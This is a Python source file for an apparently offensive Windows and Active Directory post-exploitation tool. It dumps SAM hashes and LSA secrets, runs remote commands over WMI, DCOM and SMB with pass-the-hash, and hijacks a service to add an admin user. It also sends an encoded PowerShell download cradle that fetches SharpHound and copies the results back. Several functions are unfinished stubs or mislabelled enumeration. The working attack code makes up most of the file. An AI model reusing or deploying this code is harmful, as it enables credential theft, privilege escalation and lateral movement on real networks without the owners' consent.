"""
Implementation of privilege escalation attacks for compromised low-privilege sessions.
Focuses on living off the land techniques and credential extraction.
Primary methods:
- Credential extraction (secretsdump)
- Token manipulation using built-in Windows tools
- Service/Registry/Task abuse with existing binaries
- Named pipe impersonation
"""

from typing import Optional, Dict, List, Callable, Tuple
import subprocess
import threading
import time
import os
from .attack_base import AttackBase
from impacket.dcerpc.v5 import transport, srvs, wkst, scmr, wmiquery
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
import socket
import random
import string
import tempfile
import json
import platform
import base64

class PrivEscAttacks(AttackBase):
    def __init__(self):
        super().__init__()
        self.stop_attack = False
        self.current_session = None
        
    def set_session(self, session_info: Dict):
        """
        Set the current session for privilege escalation attempts
        
        Args:
            session_info: Dictionary containing session details
                - host: Target host
                - username: Authenticated username
                - domain: Domain name
                - hash: NTLM hash (if using pass-the-hash)
                - password: Cleartext password (if available)
                - session_type: Type of session ('smb', 'wmi', 'poisoning', etc.)
        """
        if session_info.get('session_type') == 'poisoning':
            print("\n[!] Warning: Poisoning/relay sessions should be handled with care:")
            print("    • May impact network devices if kept alive too long")
            print("    • Consider using temporary connections instead")
            print("    • Monitor for network stability issues")
            if input("\nContinue with poisoning session? (y/n): ").lower() != 'y':
                return
                
        self.current_session = session_info
        
        # Set session timeout for safety
        if session_info.get('session_type') == 'poisoning':
            self.session_timeout = 300  # 5 minutes for poisoning sessions
        else:
            self.session_timeout = 3600  # 1 hour for normal sessions
        
    def get_credentials_from_db(self) -> List[Dict]:
        """Get available credentials from database"""
        creds = []
        
        # Get cleartext credentials
        cleartext = self.db.get_cleartext_credentials()
        for cred in cleartext:
            creds.append({
                'username': cred[2],
                'domain': cred[4],
                'password': cred[5],
                'type': 'cleartext',
                'source': cred[1]
            })
            
        # Get hashes
        hashes = self.db.get_captured_hashes()
        for hash_entry in hashes:
            creds.append({
                'username': hash_entry[2],
                'hash': hash_entry[3],
                'type': 'hash',
                'source': hash_entry[1]
            })
            
        return creds
        
    def dump_credentials(self, target: str) -> bool:
        """
        Dump credentials using secretsdump
        
        Args:
            target: Target host
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if not self.current_session:
                self.log_error("No active session")
                return False
                
            # Connect to target
            smb = SMBConnection(target, target)
            if self.current_session.get('hash'):
                smb.login(self.current_session['username'], '', 
                         self.current_session['domain'],
                         nthash=self.current_session['hash'])
            else:
                smb.login(self.current_session['username'],
                         self.current_session['password'],
                         self.current_session['domain'])
                         
            # Initialize remote operations
            remoteOps = RemoteOperations(smb, False)
            remoteOps.enableRegistry()
            
            # Dump SAM hashes
            bootKey = remoteOps.getBootKey()
            SAMFileName = remoteOps.saveSAM()
            sam_hashes = SAMHashes(SAMFileName, bootKey, self.log_info)
            sam_hashes.dump()
            
            # Dump LSA secrets
            LSAFileName = remoteOps.saveLSA()
            lsa_secrets = LSASecrets(LSAFileName, bootKey, self.log_info)
            lsa_secrets.dumpSecrets()
            
            # Save to database
            self._save_credentials_to_db(sam_hashes, lsa_secrets)
            
            return True
            
        except Exception as e:
            self.log_error(f"Credential dump error: {str(e)}")
            return False
            
    def check_token_privs(self, target: str) -> Dict:
        """
        Check available token privileges using built-in Windows tools
        
        Args:
            target: Target host
            
        Returns:
            Dictionary of available privileges and their status
        """
        try:
            if not self.current_session:
                self.log_error("No active session")
                return {}
                
            # Use whoami /priv through SMB
            command = "whoami /priv"
            output = self._execute_command(target, command)
            
            return self._parse_token_privs(output)
            
        except Exception as e:
            self.log_error(f"Token privilege check error: {str(e)}")
            return {}
            
    def exploit_token_privs(self, target: str, priv: str) -> bool:
        """
        Exploit token privileges using built-in Windows tools
        
        Args:
            target: Target host
            priv: Privilege to exploit
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if not self.current_session:
                self.log_error("No active session")
                return False
                
            if priv == 'SeImpersonatePrivilege':
                return self._exploit_impersonation_native(target)
            elif priv == 'SeDebugPrivilege':
                return self._exploit_debug_native(target)
            elif priv == 'SeBackupPrivilege':
                return self._exploit_backup_native(target)
                
            return False
            
        except Exception as e:
            self.log_error(f"Token privilege exploit error: {str(e)}")
            return False
            
    def check_service_hijack(self, target: str) -> List[Dict]:
        """
        Check for service binary/DLL hijacking opportunities using built-in tools
        
        Args:
            target: Target host
            
        Returns:
            List of vulnerable services with details
        """
        try:
            if not self.current_session:
                self.log_error("No active session")
                return []
                
            # Use sc qc and icacls through SMB
            services_cmd = "sc query"
            services_output = self._execute_command(target, services_cmd)
            
            vulnerable_services = []
            for service in self._parse_services(services_output):
                perms_cmd = f"icacls {service['binary_path']}"
                perms_output = self._execute_command(target, perms_cmd)
                
                if self._check_service_vulnerable_native(perms_output):
                    vulnerable_services.append(service)
                    
            return vulnerable_services
            
        except Exception as e:
            self.log_error(f"Service check error: {str(e)}")
            return []
            
    def exploit_service_hijack(self, target: str, service: Dict) -> bool:
        """
        Exploit service using built-in Windows tools
        
        Args:
            target: Target host
            service: Service details
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if not self.current_session:
                self.log_error("No active session")
                return False
                
            # Use built-in tools for service exploitation
            commands = [
                f"sc stop {service['name']}",
                f"sc config {service['name']} binpath= \"net user admin password /add\"",
                f"sc start {service['name']}",
                "net localgroup administrators admin /add"
            ]
            
            for cmd in commands:
                output = self._execute_command(target, cmd)
                if "error" in output.lower():
                    return False
                    
            return True
            
        except Exception as e:
            self.log_error(f"Service hijack error: {str(e)}")
            return False
            
    def _execute_command(self, target: str, command: str, method: str = 'auto') -> str:
        """
        Execute command on target using various methods
        
        Args:
            target: Target host
            command: Command to execute
            method: Execution method ('wmi', 'dcom', 'psexec', 'smb', or 'auto')
            
        Returns:
            str: Command output
        """
        methods = {
            'wmi': self._execute_wmi,
            'dcom': self._execute_dcom,
            'psexec': self._execute_psexec,
            'smb': self._execute_smb
        }
        
        if method == 'auto':
            # Try methods in order of stealth
            for m in ['wmi', 'dcom', 'smb', 'psexec']:
                try:
                    return methods[m](target, command)
                except Exception as e:
                    self.log_error(f"{m.upper()} execution failed: {str(e)}")
            return ""
        else:
            try:
                return methods[method](target, command)
            except Exception as e:
                self.log_error(f"Command execution error ({method}): {str(e)}")
                return ""
                
    def _execute_wmi(self, target: str, command: str) -> str:
        """Execute command using WMI"""
        try:
            # Setup WMI connection
            dcom = DCOMConnection(
                target,
                self.current_session['username'],
                self.current_session['password'],
                self.current_session['domain'],
                oxidResolver=True,
                lmhash="",
                nthash=self.current_session.get('hash', '')
            )
            
            # Create WMI interface
            iWbemLevel1Login = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,
                                                     wmi.IID_IWbemLevel1Login)
            
            # Connect to WMI namespace
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', '', '')
            
            # Execute command
            win32Process, _ = iWbemServices.GetObject('Win32_Process')
            
            # Create process
            process_id = win32Process.Create(command, 'C:\\', None)
            
            # Wait for output
            time.sleep(2)
            
            # Get output using another command
            output = self._get_command_output(target, process_id)
            
            # Cleanup
            dcom.disconnect()
            
            return output
            
        except Exception as e:
            raise Exception(f"WMI execution failed: {str(e)}")
            
    def _execute_dcom(self, target: str, command: str) -> str:
        """Execute command using DCOM"""
        try:
            dcom = DCOMConnection(
                target,
                self.current_session['username'],
                self.current_session['password'],
                self.current_session['domain'],
                oxidResolver=True,
                lmhash="",
                nthash=self.current_session.get('hash', '')
            )
            
            # Use MMC20.Application DCOM object
            mmc = dcom.CoCreateInstanceEx(wmi.CLSID_MMC20, wmi.IID_IDispatch)
            
            # Execute command
            cmd_line = f'cmd.exe /c {command} > C:\\Windows\\Temp\\output.txt'
            mmc.Document.ActiveView.ExecuteShellCommand('cmd.exe', 
                                                      '/c ' + cmd_line,
                                                      'C:\\Windows\\System32',
                                                      None)
            
            # Wait for output
            time.sleep(2)
            
            # Read output file
            output = self._read_output_file(target)
            
            # Cleanup
            dcom.disconnect()
            
            return output
            
        except Exception as e:
            raise Exception(f"DCOM execution failed: {str(e)}")
            
    def _execute_psexec(self, target: str, command: str) -> str:
        """Execute command using PsExec-like functionality"""
        try:
            # Connect to SMB
            smb = SMBConnection(target, target)
            if self.current_session.get('hash'):
                smb.login(self.current_session['username'], '', 
                         self.current_session['domain'],
                         nthash=self.current_session['hash'])
            else:
                smb.login(self.current_session['username'],
                         self.current_session['password'],
                         self.current_session['domain'])
                         
            # Create service
            service_name = ''.join(random.choices(string.ascii_letters, k=8))
            remoteOps = RemoteOperations(smb, False)
            remoteOps.enableRegistry()
            
            # Execute command and get output
            output = remoteOps.executeRemote(command)
            
            # Cleanup
            remoteOps.finish()
            
            return output
            
        except Exception as e:
            raise Exception(f"PsExec execution failed: {str(e)}")
            
    def _execute_smb(self, target: str, command: str) -> str:
        """Execute command using SMB and WMIC"""
        try:
            # Connect to SMB
            smb = SMBConnection(target, target)
            if self.current_session.get('hash'):
                smb.login(self.current_session['username'], '', 
                         self.current_session['domain'],
                         nthash=self.current_session['hash'])
            else:
                smb.login(self.current_session['username'],
                         self.current_session['password'],
                         self.current_session['domain'])
                         
            # Use WMIC to execute command
            cmd_line = f'cmd.exe /c {command} > C:\\Windows\\Temp\\output.txt'
            smb.executeCommand(cmd_line)
            
            # Wait for output
            time.sleep(2)
            
            # Read output file
            output = self._read_output_file(target)
            
            return output
            
        except Exception as e:
            raise Exception(f"SMB execution failed: {str(e)}")
            
    def _get_command_output(self, target: str, process_id: int) -> str:
        """Get output from a command using various methods"""
        try:
            # Try reading from temp file
            return self._read_output_file(target)
        except:
            # Fallback to other methods if needed
            return ""
            
    def _read_output_file(self, target: str) -> str:
        """Read command output from temporary file"""
        try:
            smb = SMBConnection(target, target)
            if self.current_session.get('hash'):
                smb.login(self.current_session['username'], '', 
                         self.current_session['domain'],
                         nthash=self.current_session['hash'])
            else:
                smb.login(self.current_session['username'],
                         self.current_session['password'],
                         self.current_session['domain'])
                         
            # Read output file
            share = "C$"
            path = "Windows\\Temp\\output.txt"
            
            output = ""
            with tempfile.NamedTemporaryFile() as temp:
                smb.getFile(share, path, temp.name)
                with open(temp.name, 'r') as f:
                    output = f.read()
                    
            # Delete output file
            smb.deleteFile(share, path)
            
            return output
            
        except Exception:
            return ""
        
    def _parse_token_privs(self, output: str) -> Dict:
        """Parse whoami /priv output"""
        privs = {}
        try:
            for line in output.splitlines():
                if "Privilege Name" in line:
                    continue
                parts = line.split()
                if len(parts) >= 2:
                    privs[parts[0]] = parts[-1] == "Enabled"
        except Exception:
            pass
        return privs
        
    def _exploit_impersonation_native(self, target: str) -> bool:
        """Exploit SeImpersonatePrivilege using built-in tools"""
        try:
            # Use built-in Windows tools for impersonation
            commands = [
                "whoami /all",  # Check current privileges
                "net user",     # List users
                "net localgroup administrators"  # Check admin group
            ]
            
            for cmd in commands:
                output = self._execute_command(target, cmd)
                if "error" in output.lower():
                    return False
                    
            return True
            
        except Exception:
            return False
            
    def _exploit_debug_native(self, target: str) -> bool:
        """Exploit SeDebugPrivilege using built-in tools"""
        try:
            # Use built-in Windows tools for debug privilege
            commands = [
                "tasklist /v",  # List processes
                "tasklist /svc",  # List service processes
                "query process *"  # Query all processes
            ]
            
            for cmd in commands:
                output = self._execute_command(target, cmd)
                if "error" in output.lower():
                    return False
                    
            return True
            
        except Exception:
            return False
            
    def _exploit_backup_native(self, target: str) -> bool:
        """Exploit SeBackupPrivilege using built-in tools"""
        try:
            # Use built-in Windows tools for backup privilege
            commands = [
                "wbadmin get status",  # Check backup status
                "wbadmin get items",   # List backup items
                "vssadmin list shadows"  # List shadow copies
            ]
            
            for cmd in commands:
                output = self._execute_command(target, cmd)
                if "error" in output.lower():
                    return False
                    
            return True
            
        except Exception:
            return False
            
    def _parse_services(self, output: str) -> List[Dict]:
        """Parse sc query output"""
        services = []
        try:
            current_service = {}
            for line in output.splitlines():
                if "SERVICE_NAME" in line:
                    if current_service:
                        services.append(current_service)
                    current_service = {'name': line.split(':')[1].strip()}
                elif "BINARY_PATH_NAME" in line:
                    current_service['binary_path'] = line.split(':')[1].strip()
                    
            if current_service:
                services.append(current_service)
                
        except Exception:
            pass
        return services
        
    def _check_service_vulnerable_native(self, perms_output: str) -> bool:
        """Check if service is vulnerable using built-in tools output"""
        try:
            # Check for weak permissions in icacls output
            weak_perms = ['F', 'M', 'W']  # Full, Modify, Write
            for perm in weak_perms:
                if f":(OI)(CI){perm}" in perms_output:
                    return True
            return False
        except Exception:
            return False
            
    def _save_credentials_to_db(self, sam_hashes, lsa_secrets):
        """Save dumped credentials to database"""
        try:
            # Implementation of credential saving
            pass
        except Exception:
            pass

    def manage_credentials(self, new_creds: List[Dict]) -> None:
        """
        Update the database with new credentials or changes in privilege levels.
        
        Args:
            new_creds: List of new credentials to add or update
        """
        try:
            for cred in new_creds:
                # Check if credential already exists
                existing = self.db.get_credential(cred['username'], cred['domain'])
                if existing:
                    # Update if privilege level has changed
                    if cred['type'] == 'hash' and existing['type'] != 'hash':
                        self.db.update_credential(cred)
                else:
                    # Add new credential
                    self.db.add_credential(cred)
        except Exception as e:
            self.log_error(f"Credential management error: {str(e)}")

    def escalate_privileges(self, target: str) -> bool:
        """
        Attempt privilege escalation using known techniques.
        
        Args:
            target: Target host
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Check and exploit token privileges
            privs = self.check_token_privs(target)
            for priv, enabled in privs.items():
                if enabled and self.exploit_token_privs(target, priv):
                    return True
            
            # Check and exploit service hijacking
            services = self.check_service_hijack(target)
            for service in services:
                if self.exploit_service_hijack(target, service):
                    return True
            
            return False
        except Exception as e:
            self.log_error(f"Privilege escalation error: {str(e)}")
            return False

    def enumerate_active_directory(self, target: str) -> Dict:
        """
        Perform comprehensive Active Directory enumeration.
        
        Args:
            target: Target domain controller
            
        Returns:
            Dictionary containing domain information
        """
        try:
            domain_info = self.enumerate_domain(target)
            self.log_info(f"Domain Information: {json.dumps(domain_info, indent=2)}")
            return domain_info
        except Exception as e:
            self.log_error(f"Active Directory enumeration error: {str(e)}")
            return {}

    def collect_bloodhound_data(self, target: str) -> bool:
        """
        Run BloodHound collection using SharpHound or bloodhound-python.
        
        Args:
            target: Target domain controller
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if self._check_platform() == 'linux':
                self.log_info("Using bloodhound-python for data collection on Linux.")
                return self.run_bloodhound_python(target)
            else:
                if self._check_platform() != 'windows':
                    self.log_warning("BloodHound collection is optimized for Windows environments. Consider using a Windows host.")
                return self.run_bloodhound(target)
        except Exception as e:
            self.log_error(f"BloodHound collection error: {str(e)}")
            return False

    def run_bloodhound(self, target: str) -> bool:
        """
        Execute SharpHound for BloodHound data collection.
        
        Args:
            target: Target domain controller
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Create PowerShell download cradle for SharpHound
            ps_command = """
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
            $url = 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1';
            $null = Invoke-WebRequest -Uri $url -OutFile $env:temp\SharpHound.ps1;
            Import-Module $env:temp\SharpHound.ps1;
            Invoke-BloodHound -CollectionMethod All -OutputDirectory $env:temp -CompressData
            """
            
            # Execute SharpHound
            command = f'powershell -enc {self._encode_powershell(ps_command)}'
            output = self._execute_command(target, command)
            
            # Get the results file
            zip_path = "Windows\Temp\*BloodHound.zip"
            self._get_bloodhound_results(target, zip_path)
            
            return True
        except Exception as e:
            self.log_error(f"BloodHound execution error: {str(e)}")
            return False

    def _encode_powershell(self, command: str) -> str:
        """Base64 encode PowerShell command"""
        try:
            command_bytes = command.encode('utf-16le')
            return base64.b64encode(command_bytes).decode()
        except Exception:
            return ""

    def _get_bloodhound_results(self, target: str, zip_path: str) -> bool:
        """Download BloodHound results"""
        try:
            smb = SMBConnection(target, target)
            if self.current_session.get('hash'):
                smb.login(self.current_session['username'], '', 
                         self.current_session['domain'],
                         nthash=self.current_session['hash'])
            else:
                smb.login(self.current_session['username'],
                         self.current_session['password'],
                         self.current_session['domain'])
                         
            share = "C$"
            with tempfile.NamedTemporaryFile() as temp:
                smb.getFile(share, zip_path, temp.name)
                # TODO: Process BloodHound results
                
            return True
            
        except Exception:
            return False

    def run_bloodhound_python(self, target: str) -> bool:
        """
        Execute bloodhound-python for BloodHound data collection on Linux.
        
        Args:
            target: Target domain controller
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Check if bloodhound-python is installed
            if subprocess.call(['which', 'bloodhound-python'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                self.log_error("bloodhound-python is not installed. Please install it using 'pip install bloodhound-python'.")
                return False
            
            # Run bloodhound-python
            command = [
                'bloodhound-python',
                '-d', self.current_session['domain'],
                '-u', self.current_session['username'],
                '-p', self.current_session['password'],
                '-c', 'All',
                '-dc', target
            ]
            subprocess.run(command, check=True)
            self.log_info("BloodHound data collection with bloodhound-python successful.")
            return True
        except subprocess.CalledProcessError as e:
            self.log_error(f"bloodhound-python execution error: {str(e)}")
            return False
        except Exception as e:
            self.log_error(f"Unexpected error during bloodhound-python execution: {str(e)}")
            return False

    def _check_platform(self) -> str:
        """
        Check the current platform and return its name.
        
        Returns:
            str: 'linux', 'windows', or 'unknown'
        """
        platform_name = platform.system().lower()
        if 'linux' in platform_name:
            return 'linux'
        elif 'windows' in platform_name:
            return 'windows'
        else:
            return 'unknown'

    def startup_status(self) -> None:
        """
        Print a comprehensive status report and suggest context-based next steps.
        """
        print("\n" + "="*60)
        print(f"{'PRIVILEGE ESCALATION TOOL STATUS':^60}")
        print("="*60)
        
        # Check if we have an active session
        print("\n[+] SESSION STATUS:")
        if self.current_session:
            print(f"  ✓ Active session established")
            print(f"    • Host: {self.current_session.get('host', 'N/A')}")
            print(f"    • Username: {self.current_session.get('username', 'N/A')}")
            print(f"    • Domain: {self.current_session.get('domain', 'N/A')}")
            print(f"    • Authentication: {'Pass-the-Hash' if self.current_session.get('hash') else 'Password'}")
            
            # Check account privileges if available
            if hasattr(self, 'privs') and self.privs:
                print("\n  Detected privileges:")
                for priv, enabled in self.privs.items():
                    print(f"    • {priv}: {'Enabled' if enabled else 'Disabled'}")
        else:
            print("  ✗ No active session")
        
        # Check available credentials in database
        print("\n[+] CREDENTIAL STATUS:")
        credentials = self.get_credentials_from_db()
        if credentials:
            cleartext = [c for c in credentials if c.get('type') == 'cleartext']
            hashes = [c for c in credentials if c.get('type') == 'hash']
            print(f"  ✓ {len(credentials)} credentials available in database:")
            print(f"    • {len(cleartext)} cleartext passwords")
            print(f"    • {len(hashes)} password hashes")
        else:
            print("  ✗ No credentials in database")
        
        # Check enumeration status
        print("\n[+] ENUMERATION STATUS:")
        enumeration_status = self._get_enumeration_status()
        for key, status in enumeration_status.items():
            print(f"  {'✓' if status else '✗'} {key}")
        
        # Suggest context-based next steps
        print("\n[+] SUGGESTED NEXT STEPS:")
        if not self.current_session and not credentials:
            print("  1. Perform network scan to discover live hosts")
            print("  2. Enumerate SMB shares with null/guest access")
            print("  3. Attempt password spraying with common credentials")
            print("  4. Check for ASREPRoastable or Kerberoastable accounts")
        elif not self.current_session and credentials:
            print("  1. Establish a session using existing credentials")
            print("  2. Verify access level for each credential set")
            print("  3. Test credentials against multiple hosts")
        elif self.current_session:
            # If we have a session, suggest next steps based on privileges
            privs = getattr(self, 'privs', {})
            if any(enabled for priv, enabled in privs.items()):
                print("  1. Attempt privilege escalation using detected privileges")
                print("  2. Dump credentials from the target system")
                print("  3. Lateral movement to other systems in the network")
            else:
                print("  1. Enumerate privileges with 'whoami /priv'")
                print("  2. Check for service vulnerabilities")
                print("  3. Collect BloodHound data for attack path analysis")
            
            # AD enumeration suggestions if we're in a domain
            if self.current_session.get('domain'):
                print("  4. Perform Active Directory enumeration")
                print("  5. Gather LDAP and DNS information")
        
        # Platform-specific guidance
        platform = self._check_platform()
        print(f"\n[+] PLATFORM STATUS: Running on {platform.upper()}")
        if platform == 'linux':
            print("  • Using native Kali Linux toolset")
            print("  • BloodHound collection will use bloodhound-python")
        elif platform == 'windows':
            print("  • Using Windows-optimized toolset")
            print("  • BloodHound collection will use SharpHound")
        
        print("\n" + "="*60)
    
    def _get_enumeration_status(self) -> Dict[str, bool]:
        """
        Get the status of various enumeration tasks.
        
        Returns:
            Dictionary with enumeration tasks and their status
        """
        status = {
            "Host discovery": False,
            "SMB enumeration": False,
            "AD enumeration": False,
            "BloodHound collection": False,
            "LDAP enumeration": False,
            "DNS enumeration": False,
            "Privilege check": False
        }
        
        # Check if we have host data
        if hasattr(self, 'hosts') and self.hosts:
            status["Host discovery"] = True
        
        # Check if we have AD data
        if hasattr(self, 'domain_info') and self.domain_info:
            status["AD enumeration"] = True
        
        # Check if we have BloodHound data
        if hasattr(self, 'bloodhound_data') and self.bloodhound_data:
            status["BloodHound collection"] = True
        
        # Check if we have LDAP data
        if hasattr(self, 'ldap_info') and self.ldap_info:
            status["LDAP enumeration"] = True
        
        # Check if we have DNS data
        if hasattr(self, 'dns_info') and self.dns_info:
            status["DNS enumeration"] = True
        
        # Check if we have privilege data
        if hasattr(self, 'privs') and self.privs:
            status["Privilege check"] = True
        
        return status
        
    def run(self):
        """
        Main method to run the tool, providing a smooth user experience.
        """
        try:
            # Initialize tracking attributes
            self._initialize_tracking()
            
            while True:
                # Display current status and menu
                self.startup_status()
                choice = self._show_menu()
                
                if choice == 'q':
                    break
                    
                self._handle_menu_choice(choice)
                
        except Exception as e:
            self.log_error(f"Error in main execution: {str(e)}")
            return False
            
    def _initialize_tracking(self):
        """Initialize attributes for tracking tool state"""
        self.hosts = getattr(self, 'hosts', [])
        self.domain_info = getattr(self, 'domain_info', {})
        self.bloodhound_data = getattr(self, 'bloodhound_data', {})
        self.ldap_info = getattr(self, 'ldap_info', {})
        self.dns_info = getattr(self, 'dns_info', {})
        self.privs = getattr(self, 'privs', {})
        self.smb_shares = getattr(self, 'smb_shares', {})
        self.attack_paths = getattr(self, 'attack_paths', [])
        
    def _show_menu(self) -> str:
        """
        Display the main menu based on current state
        
        Returns:
            str: User's choice
        """
        print("\n=== Main Menu ===")
        
        if not self.current_session and not self.get_credentials_from_db():
            # No session or credentials
            print("1. Discover live hosts")
            print("2. Service enumeration (nmap)")
            print("3. Check null/guest SMB access")
            print("4. Password spraying")
            print("5. ASREPRoast scan")
            print("6. Kerberoast scan")
            valid_choices = ['1', '2', '3', '4', '5', '6']
            
        elif not self.current_session and self.get_credentials_from_db():
            # Have credentials but no session
            print("1. List available credentials")
            print("2. Test credentials against hosts")
            print("3. Quick service scan")
            print("4. Show potential targets")
            print("5. Establish new connection")
            valid_choices = ['1', '2', '3', '4', '5']
            
        elif self.current_session:
            # Active session
            print("1. Check current privileges")
            print("2. Service enumeration")
            print("3. Dump credentials")
            print("4. BloodHound collection")
            if self.current_session.get('domain'):
                print("5. AD enumeration")
                print("6. LDAP enumeration")
                print("7. DNS enumeration")
                valid_choices = ['1', '2', '3', '4', '5', '6', '7']
            else:
                valid_choices = ['1', '2', '3', '4']
            print("\n[!] Warning: Active session in use. Use with caution.")
                
        print("\nq. Quit")
        valid_choices.append('q')
        
        while True:
            choice = input("\nEnter your choice: ").lower()
            if choice in valid_choices:
                return choice
            print("Invalid choice. Please try again.")
            
    def _handle_menu_choice(self, choice: str):
        """
        Handle the user's menu selection
        
        Args:
            choice: User's menu choice
        """
        try:
            if not self.current_session and not self.get_credentials_from_db():
                # No session or credentials
                if choice == '1':
                    self._discover_hosts()
                elif choice == '2':
                    self._scan_services()
                elif choice == '3':
                    self._check_null_sessions()
                elif choice == '4':
                    self._password_spray()
                elif choice == '5':
                    self._asreproast_scan()
                elif choice == '6':
                    self._kerberoast_scan()
                    
            elif not self.current_session and self.get_credentials_from_db():
                # Have credentials but no session
                if choice == '1':
                    self._list_credentials()
                elif choice == '2':
                    self._test_credentials()
                elif choice == '3':
                    self._establish_session()
                elif choice == '4':
                    self._show_targets()
                    
            elif self.current_session:
                # Active session
                if choice == '1':
                    self._check_current_privs()
                elif choice == '2':
                    self._enumerate_services()
                elif choice == '3':
                    self._dump_creds()
                elif choice == '4':
                    self._collect_bloodhound()
                elif choice == '5' and self.current_session.get('domain'):
                    self._enumerate_ad()
                elif choice == '6' and self.current_session.get('domain'):
                    self._enumerate_ldap()
                elif choice == '7' and self.current_session.get('domain'):
                    self._enumerate_dns()
                    
        except Exception as e:
            self.log_error(f"Error handling menu choice: {str(e)}")
            
    def _discover_hosts(self):
        """Discover live hosts in the network"""
        try:
            print("\n[*] Discovering live hosts...")
            target_range = input("Enter target range (e.g. 192.168.1.0/24): ")
            
            # Initial ping sweep
            print("[*] Performing initial ping sweep...")
            ping_cmd = f"nmap -sn {target_range} -oG - | grep 'Up'"
            result = subprocess.run(ping_cmd, shell=True, capture_output=True, text=True)
            
            # Parse live hosts
            live_hosts = []
            for line in result.stdout.splitlines():
                if "Up" in line:
                    ip = line.split()[1]
                    live_hosts.append(ip)
            
            if not live_hosts:
                print("[-] No live hosts found.")
                return
                
            print(f"\n[+] Found {len(live_hosts)} live hosts")
            self.hosts = live_hosts
            
            # Ask for service scan
            if input("\n[?] Would you like to perform a service scan? (y/n): ").lower() == 'y':
                self._scan_services(live_hosts)
                
        except Exception as e:
            self.log_error(f"Host discovery error: {str(e)}")
            
    def _scan_services(self, targets: List[str] = None):
        """
        Perform service scanning on targets
        
        Args:
            targets: List of target IPs. If None, use self.hosts
        """
        try:
            if not targets and hasattr(self, 'hosts'):
                targets = self.hosts
            if not targets:
                print("[-] No targets specified for scanning.")
                return
                
            print("\n[*] Select scan type:")
            print("1. Quick scan (common ports)")
            print("2. Standard scan (top 1000 ports)")
            print("3. Full scan (all ports)")
            print("4. Vulnerability scan")
            
            scan_type = input("\nEnter choice (1-4): ")
            
            # Build nmap command based on scan type
            if scan_type == '1':
                cmd = f"nmap -sV -sC -T4 -F --open"
            elif scan_type == '2':
                cmd = f"nmap -sV -sC -T4 --open"
            elif scan_type == '3':
                print("[!] Warning: Full port scan may take a long time")
                cmd = f"nmap -sV -sC -T4 -p- --open"
            elif scan_type == '4':
                print("[!] Warning: Vulnerability scan may be noisy")
                cmd = f"nmap -sV -sC --script vuln -T4 --open"
            else:
                print("[-] Invalid choice")
                return
                
            # Add targets
            cmd += f" {' '.join(targets)}"
            
            print(f"\n[*] Running scan: {cmd}")
            subprocess.run(cmd, shell=True)
            
        except Exception as e:
            self.log_error(f"Service scan error: {str(e)}")
            
    def _check_null_sessions(self):
        """Check for null session access"""
        try:
            print("\n[*] Checking for null session access...")
            # TODO: Implement null session checks
        except Exception as e:
            self.log_error(f"Null session check error: {str(e)}")
            
    def _password_spray(self):
        """Perform password spraying attack"""
        try:
            print("\n[*] Starting password spray...")
            # TODO: Implement password spraying
        except Exception as e:
            self.log_error(f"Password spray error: {str(e)}")
            
    def _asreproast_scan(self):
        """Perform ASREPRoast scan"""
        try:
            print("\n[*] Starting ASREPRoast scan...")
            # TODO: Implement ASREPRoast
        except Exception as e:
            self.log_error(f"ASREPRoast scan error: {str(e)}")
            
    def _kerberoast_scan(self):
        """Perform Kerberoasting scan"""
        try:
            print("\n[*] Starting Kerberoast scan...")
            # TODO: Implement Kerberoasting
        except Exception as e:
            self.log_error(f"Kerberoast scan error: {str(e)}")
            
    def _list_credentials(self):
        """List available credentials"""
        try:
            creds = self.get_credentials_from_db()
            print("\n=== Available Credentials ===")
            for i, cred in enumerate(creds, 1):
                print(f"\n{i}. Type: {cred['type']}")
                print(f"   Username: {cred['username']}")
                print(f"   Domain: {cred.get('domain', 'N/A')}")
                print(f"   Source: {cred.get('source', 'Unknown')}")
        except Exception as e:
            self.log_error(f"List credentials error: {str(e)}")
            
    def _test_credentials(self):
        """Test credentials against targets"""
        try:
            print("\n[*] Testing credentials against targets...")
            # TODO: Implement credential testing
        except Exception as e:
            self.log_error(f"Credential testing error: {str(e)}")
            
    def _establish_session(self):
        """Establish new session with credentials"""
        try:
            print("\n[*] Establishing new session...")
            # TODO: Implement session establishment
        except Exception as e:
            self.log_error(f"Session establishment error: {str(e)}")
            
    def _show_targets(self):
        """Show potential targets"""
        try:
            print("\n=== Potential Targets ===")
            if self.hosts:
                for i, host in enumerate(self.hosts, 1):
                    print(f"{i}. {host}")
            else:
                print("No targets discovered yet.")
        except Exception as e:
            self.log_error(f"Show targets error: {str(e)}")
            
    def _check_current_privs(self):
        """Check current privileges"""
        try:
            print("\n[*] Checking current privileges...")
            if self.current_session:
                self.check_token_privs(self.current_session['host'])
        except Exception as e:
            self.log_error(f"Check privileges error: {str(e)}")
            
    def _enumerate_services(self):
        """Enumerate services"""
        try:
            print("\n[*] Enumerating services...")
            if self.current_session:
                self.check_service_hijack(self.current_session['host'])
        except Exception as e:
            self.log_error(f"Service enumeration error: {str(e)}")
            
    def _dump_creds(self):
        """Dump credentials"""
        try:
            print("\n[*] Dumping credentials...")
            if self.current_session:
                self.dump_credentials(self.current_session['host'])
        except Exception as e:
            self.log_error(f"Credential dump error: {str(e)}")
            
    def _collect_bloodhound(self):
        """Collect BloodHound data"""
        try:
            print("\n[*] Collecting BloodHound data...")
            if self.current_session:
                self.collect_bloodhound_data(self.current_session['host'])
        except Exception as e:
            self.log_error(f"BloodHound collection error: {str(e)}")
            
    def _enumerate_ad(self):
        """Enumerate Active Directory"""
        try:
            print("\n[*] Enumerating Active Directory...")
            if self.current_session and self.current_session.get('domain'):
                self.enumerate_active_directory(self.current_session['host'])
        except Exception as e:
            self.log_error(f"AD enumeration error: {str(e)}")
            
    def _enumerate_ldap(self):
        """Enumerate LDAP"""
